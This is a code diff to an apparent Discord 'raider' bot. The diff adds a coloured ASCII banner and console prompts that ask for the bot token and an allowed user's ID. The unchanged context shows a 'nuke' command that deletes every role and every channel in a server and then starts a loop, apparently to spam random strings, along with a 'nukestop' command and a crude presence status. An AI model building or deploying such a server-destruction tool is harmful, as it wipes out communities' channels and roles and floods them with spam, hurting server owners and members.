@@ -3,9 +3,23 @@ from discord.ext import commands
 import asyncio
 import random
 import string
+import colorama
+from colorama import Fore
 
+colorama.init()
 
-allowed_users = "YOUR DISCORD ID HERE"
+print(Fore.RED, "  ____                      __                      __  __     _           __     ")
+print(Fore.RED, "/\   _`\             __    /\ \                    /\ \/\ \  /' \        /'__`\   ")
+print(Fore.MAGENTA, "\ \  \L\ \     __   /\_\   \_\ \     __    _ __    \ \ \ \ \/\_, \      /\ \/\ \  ")
+print(Fore.MAGENTA, " \ \  ,  /   /'__`\ \/\ \  /'_` \  /'__`\ /\`'__\   \ \ \ \ \/_/\ \     \ \ \ \ \ ")
+print(Fore.BLUE, "  \ \ \ \ \ /\ \L\.\_\ \ \/\ \L\ \/\  __/ \ \ \/     \ \ \_/ \ \ \ \  __ \ \ \_\ \ ")
+print(Fore.BLUE, "   \ \_\ \_\ \__/.\_\ \ \_\ \___,_\ \____\ \ \_\      \ `\___/  \ \_\/\_\ \ \____/")
+print(Fore.CYAN, "    \/_/\/_/\/__/\/_/  \/_/\/__,_ /\/____/  \/_/      `\/__ /    \/_/\/_/  \/___/ \n")
+
+print(Fore.YELLOW + "Enter your bot token:" + Fore.RESET)
+botToken = input()
+print(Fore.YELLOW + "Enter your Discord ID:" + Fore.RESET)
+allowed_users = str(input())
 keepLooking = False
 
 
@@ -15,8 +29,8 @@ bot = commands.Bot(command_prefix=commands.when_mentioned_or(">"))
 @bot.event
 async def on_ready():
     await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name="your mom on OnlyFans"), status=discord.Status.idle)
-    print(f'Logged in as {bot.user} (ID: {bot.user.id})')
-    print('---------------------------------------------------')
+    print(Fore.GREEN +
+          f'Logged in as {bot.user} (Bot ID: {bot.user.id})' + Fore.RESET)
 
 
 @bot.command()
@@ -53,14 +67,14 @@ async def nuke(ctx, id: str):
                     roleCount = roleCount + 1
 
                 print(
-                    f"Succesfully deleted {roleCount} roles. Deleting channels...")
+                    Fore.GREEN + f"Succesfully deleted {roleCount} roles. Deleting channels..." + Fore.RESET)
 
                 for channel in ctx.guild.channels:
                     await channel.delete()
                     channelCount = channelCount + 1
 
                 print(
-                    f"Succesfully deleted {channelCount} channels. Starting loop...")
+                    Fore.GREEN + f"Succesfully deleted {channelCount} channels. Starting loop..." + Fore.RESET)
 
                 while keepLooking:
                     output_string = ''.join(random.SystemRandom().choice(
@@ -121,4 +135,4 @@ async def nukestop(ctx):
         return
 
 
-bot.run('BOT TOKEN HERE')
+bot.run(botToken)
